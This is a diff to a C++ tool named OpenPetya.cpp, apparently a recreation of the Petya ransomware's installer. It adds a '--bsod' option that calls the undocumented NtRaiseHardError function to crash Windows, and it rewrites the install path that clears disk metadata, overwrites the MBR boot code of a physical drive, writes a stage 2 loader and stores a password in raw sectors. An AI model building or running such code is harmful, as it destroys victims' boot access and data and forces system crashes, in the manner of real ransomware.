@@ -1,7 +1,8 @@
 // OpenPetya.cpp
 
-#include <iostream>
 #include <windows.h>
+#include <winternl.h>
+#include <iostream>
 #include <setupapi.h>
 #include <devguid.h>
 #include <fstream>
@@ -11,13 +12,26 @@
 #include <cstring>
 #include <tchar.h>
 
-#pragma comment(lib, "setupapi.dll")
+#pragma comment(lib, "setupapi.lib")
 
 #define SECTOR_SIZE 512
 #define MBR_BOOT_CODE_SIZE 446
 #define MBR_FULL_SIZE 512
 #define STAGE2_START_SECTOR 1
 #define BACKUP_MBR_SECTOR 63
+
+#ifndef STATUS_NOT_IMPLEMENTED
+#define STATUS_NOT_IMPLEMENTED ((NTSTATUS)0xC0000002L)
+#endif
+
+typedef NTSTATUS (NTAPI* NtRaiseHardError_t)(
+    NTSTATUS,
+    ULONG,
+    ULONG,
+    PULONG_PTR,
+    ULONG,
+    PULONG
+);
 
 struct stDriveInfo
 {
@@ -90,7 +104,7 @@ public:
             FILE_SHARE_READ | FILE_SHARE_WRITE,
             nullptr,
             OPEN_EXISTING,
-            FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
+            FILE_FLAG_WRITE_THROUGH,
             nullptr
         );
 
@@ -525,6 +539,29 @@ bool fnbConfirm(const std::string& szMsg)
     return szAns == "yes" || szAns == "YES" || szAns == "y";
 }
 
+UINT64 fnGetDiskTotalSectors(const std::wstring& szDrivePath)
+{
+    HANDLE hFile = CreateFileW(
+        szDrivePath.c_str(),
+        GENERIC_READ,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        nullptr,
+        OPEN_EXISTING,
+        0,
+        nullptr
+    );
+
+    if (INVALID_HANDLE_VALUE == hFile)
+        return 0;
+
+    DISK_GEOMETRY_EX geo = {};
+    DWORD ret = 0;
+    DeviceIoControl(hFile, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, nullptr, 0, &geo, sizeof(geo), &ret, nullptr);
+    CloseHandle(hFile);
+
+    return (UINT64)geo.DiskSize.QuadPart / 512;
+}
+
 bool fnbWriteDiskSize(const std::wstring& szDrivePath, UINT64 nTotalSectors)
 {
     std::cout << "\n[Write disk size] Sectors: " << nTotalSectors << "\n";
@@ -561,29 +598,6 @@ bool fnbWriteDiskSize(const std::wstring& szDrivePath, UINT64 nTotalSectors)
 
     std::cout << "\tState sector OK.\n";
     return true;
-}
-
-UINT64 fnGetDiskTotalSectors(const std::wstring& szDrivePath)
-{
-    HANDLE hFile = CreateFileW(
-        szDrivePath.c_str(),
-        GENERIC_READ,
-        FILE_SHARE_READ | FILE_SHARE_WRITE,
-        nullptr,
-        OPEN_EXISTING,
-        0,
-        nullptr
-    );
-
-    if (INVALID_HANDLE_VALUE == hFile)
-        return 0;
-
-    DISK_GEOMETRY_EX geo = {};
-    DWORD ret = 0;
-    DeviceIoControl(hFile, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, nullptr, 0, &geo, sizeof(geo), &ret, nullptr);
-    CloseHandle(hFile);
-
-    return (UINT64)geo.DiskSize.QuadPart / 512;
 }
 
 std::string fnInputPassword(const std::string& szPrompt)
@@ -701,14 +715,16 @@ void fnPrintUsage(const char* szProg)
 {
     std::wcout  << "\nUsage: " << szProg << " [options]\n\n"
                 << "Options:\n"
-                << "\t--list\n"
-                << "\t--backup-mbr <file>\n"
-                << "\t--save-chainload\n"
-                << "\t--write-mbr\n"
-                << "\t--write-stage2\n"
-                << "\t--restore-mbr\n"
-                << "\t--validate\n"
-                << "\t--install\n"
+                << "\t--list                            List physical drives\n"
+                << "\t--drive N                         Select PhysicalDriveN\n"
+                << "\t--install <mbr.bin> <stage.bin>   Full installation\n"
+                << "\t--backup-mbr <file>               Backup MBR to specified output file\n"
+                << "\t--save-chainload                  Save MBR to sector 63\n"
+                << "\t--write-mbr                       Write MBR boot code\n"
+                << "\t--write-stage2                    Write Stage2\n"
+                << "\t--restore-mbr                     Restore original MBR\n"
+                << "\t--validate                        Show disk state\n"
+                << "\t--bsod                            Raise BSOD via NtRaiseHardError()"
                 << "\nExamples:\n"
                 << "\tOpenPetya.exe --list\n"
                 << "\tOpenPetya.exe --drive 1 --backup-mbr\n"
@@ -785,6 +801,33 @@ int _tmain(int argc, char *argv[])
             bInstall = true;
             szMbrPath = argv[++i];
             szStage2Path = argv[++i];
+        }
+        else if (arg == "--bsod")
+        {
+            printf("Continue? (yes/no): ");
+            std::string szAns;
+            std::getline(std::cin, szAns);
+
+            if (szAns != "yes" && szAns != "y")
+            {
+                printf("Cancelled.\n");
+                return 0;
+            }
+
+            // Hell Yeahhhhhhh!
+            HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+            auto NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
+
+            if (!NtRaiseHardError)
+            {
+                std::cout << "Failed to get export address of NtRaiseHardError!" << std::endl;
+                return 1;
+            }
+
+            ULONG response = 0;
+            NTSTATUS status = NtRaiseHardError(STATUS_NOT_IMPLEMENTED, 0, 0, nullptr, 0, &response);
+
+            std::cout << "Status: " << std::hex << status << std::endl;
         }
         else
         {
@@ -876,34 +919,42 @@ int _tmain(int argc, char *argv[])
             return 0;
         }
 
-        // Clear old metadata
-        bRet = bRet && fnbClearMetadata(szDrivePath);
-
-        // Backup MBR to file
+        if (!fnbClearMetadata(szDrivePath)) {
+            std::cerr << "FAILED: ClearMetadata\n";
+            return 1;
+        }
         szBackupPath = "original_mbr_" + std::to_string(nIdxDrive) + ".bin";
-        bRet = bRet && fnbBackupMBR(szDrivePath, szBackupPath);
-
-        // Backup chainload
-        bRet = bRet && fnbSaveChainloadBackup(szDrivePath);
-
-        // Write custom MBR boot code
-        bRet = bRet && fnbWriteMBR(szDrivePath, szMbrPath);
-
-        // Write stage 2
-        bRet = bRet && fnbWriteStage2(szDrivePath, szStage2Path);
-
-        // Write sector 60
-        bRet = bRet && fnbWriteDiskSize(szDrivePath, nTotalSectors);
-
-        // Write password to sector 59
-        bRet = bRet && fnbWritePassword(szDrivePath, szPass1);
+        if (!fnbBackupMBR(szDrivePath, szBackupPath)) {
+            std::cerr << "FAILED: BackupMBR\n";
+            return 1;
+        }
+        if (!fnbSaveChainloadBackup(szDrivePath)) {
+            std::cerr << "FAILED: SaveChainload\n";
+            return 1;
+        }
+        if (!fnbWriteMBR(szDrivePath, szMbrPath)) {
+            std::cerr << "FAILED: WriteMBR\n";
+            return 1;
+        }
+        if (!fnbWriteStage2(szDrivePath, szStage2Path)) {
+            std::cerr << "FAILED: WriteStage2\n";
+            return 1;
+        }
+        if (!fnbWriteDiskSize(szDrivePath, nTotalSectors)) {
+            std::cerr << "FAILED: WriteDiskSize\n";
+            return 1;
+        }
+        if (!fnbWritePassword(szDrivePath, szPass1)) {
+            std::cerr << "FAILED: WritePassword\n";
+            return 1;
+        }
 
         for (char& c: szPass1)
             c = 0;
         for (char& c: szPass2)
             c = 0;
 
-        // Validate
+        // Validation
         if (bRet)
             fnbValidate(szDrivePath);
 
